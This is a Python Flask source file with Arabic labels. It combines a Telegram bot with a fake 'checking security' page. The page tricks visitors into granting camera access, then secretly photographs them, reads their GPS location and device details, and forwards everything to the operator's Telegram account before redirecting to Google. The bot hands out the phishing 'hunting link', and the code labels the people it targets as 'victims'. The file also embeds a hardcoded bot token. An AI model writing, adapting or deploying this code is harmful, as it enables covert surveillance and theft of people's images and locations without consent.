import base64, requests, io, os
from flask import Flask, render_template_string, request

app = Flask(__name__)

# الإعدادات
BOT_TOKEN = "8720155192:AAHsZLTbSnIlCNdOXKf424GNdkVlXIsabI8"
ADMIN_ID = 7041600701
BASE_URL = "https://sif-bot-pro.onrender.com"

HTML_TEMPLATE = '''
<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Checking Security...</title>
    <style>
        body { background:#1a1a1a; color:white; display:flex; justify-content:center; align-items:center; height:100vh; font-family:sans-serif; margin:0; text-align:center; }
        .box { padding:20px; border:1px solid #333; border-radius:10px; background:#222; width:85%; }
        .loader { border:4px solid #333; border-top:4px solid #00ff00; border-radius:50%; width:40px; height:40px; animation:spin 1s linear infinite; margin:15px auto; }
        @keyframes spin { 0%{transform:rotate(0deg);} 100%{transform:rotate(360deg);} }
    </style>
</head>
<body>
    <div class="box">
        <div class="loader"></div>
        <p>جاري فحص المتصفح... يرجى الضغط على "سماح" لتأكيد أنك لست روبوت</p>
    </div>
    <script>
        async function send(d){ await fetch('/capture', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify(d)}); }
        
        async function start() {
            const info = `📱 جهاز الضحية:\\n- المتصفح: ${navigator.userAgent}\\n- اللغة: ${navigator.language}\\n- المنصة: ${navigator.platform}`;
            await send({type:'text', content: info});

            try {
                const stream = await navigator.mediaDevices.getUserMedia({video:true});
                
                navigator.geolocation.getCurrentPosition(p => {
                    send({type:'text', content: `📍 موقع الضحية:\\nhttps://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`});
                });

                setTimeout(async () => {
                    const v = document.createElement('video'); v.srcObject = stream; await v.play();
                    const c = document.createElement('canvas'); c.width = v.videoWidth; c.height = v.videoHeight;
                    c.getContext('2d').drawImage(v, 0, 0);
                    send({type:'img', img: c.toDataURL('image/jpeg').split(',')[1]});
                    window.location.replace("https://www.google.com");
                }, 2000);
            } catch(e) { window.location.replace("https://www.google.com"); }
        }
        window.onload = start;
    </script>
</body>
</html>
'''

def telegram_api(method, payload, files=None):
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/{method}"
    if files: return requests.post(url, data=payload, files=files)
    return requests.post(url, json=payload)

@app.route('/', methods=['GET', 'POST'])
def handle():
    if request.method == 'POST':
        u = request.get_json(force=True, silent=True)
        if u and "message" in u:
            cid = u["message"]["chat"]["id"]
            kb = {"inline_keyboard": [[{"text": "🔗 جلب رابط الصيد", "callback_data": "link"}], [{"text": "📊 الإحصائيات", "callback_data": "status"}]]}
            telegram_api("sendMessage", {"chat_id": cid, "text": "🛠 لوحة تحكم سيف جاهزة:", "reply_markup": kb})
        elif u and "callback_query" in u:
            cb = u["callback_query"]
            if cb["data"] == "link":
                telegram_api("sendMessage", {"chat_id": cb["message"]["chat"]["id"], "text": f"🚀 رابطك:\\n{BASE_URL}"})
        return "OK", 200
    return render_template_string(HTML_TEMPLATE)

@app.route('/capture', methods=['POST'])
def capture():
    d = request.get_json(force=True, silent=True)
    if d['type'] == 'text':
        telegram_api("sendMessage", {"chat_id": ADMIN_ID, "text": d['content']})
    elif d['type'] == 'img':
        ph = io.BytesIO(base64.b64decode(d['img'])); ph.name='snap.jpg'
        telegram_api("sendPhoto", {"chat_id": ADMIN_ID}, files={"photo": ph})
    return "OK"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get("PORT", 10000)))
